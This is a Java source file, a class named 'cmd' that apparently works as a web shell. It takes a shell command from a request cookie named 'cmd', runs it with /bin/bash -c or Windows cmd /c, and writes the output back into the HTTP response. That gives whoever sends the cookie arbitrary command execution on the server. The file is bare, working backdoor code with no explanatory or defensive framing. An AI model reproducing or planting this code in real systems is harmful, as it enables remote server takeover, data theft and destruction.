import javax.servlet.http.Cookie;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;

public class cmd {
    public void e(Object request,Object response)throws Exception {
        HttpServletResponse httpServletResponse = (HttpServletResponse) response;
        HttpServletRequest httpServletRequest = (HttpServletRequest) request;
        Cookie[] cookies = httpServletRequest.getCookies();
        String cmd = null;
        if (cookies != null && cookies.length > 0) {
            for (Cookie cookie : cookies) {
                if ("cmd".equals(cookie.getName()))
                    cmd = cookie.getValue();
            }
        }
        try{
            Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd});
            InputStream is = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            String line;
            while ((line = reader.readLine()) != null) {
                //String encode = new BASE64Encoder().encode(line.getBytes("UTF-8"));
                //System.out.println(encode);
                httpServletResponse.getWriter().write(line);
            }
        }catch (IOException e){
            try{
                Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});
                InputStream is = p.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(is));
                String line;
                while ((line = reader.readLine()) != null) {
                    //String encode = new BASE64Encoder().encode(line.getBytes("UTF-8"));
                    //System.out.println(encode);
                    httpServletResponse.getWriter().write(line);
                }
            }catch (IOException ee){
            }
        }
    }
}
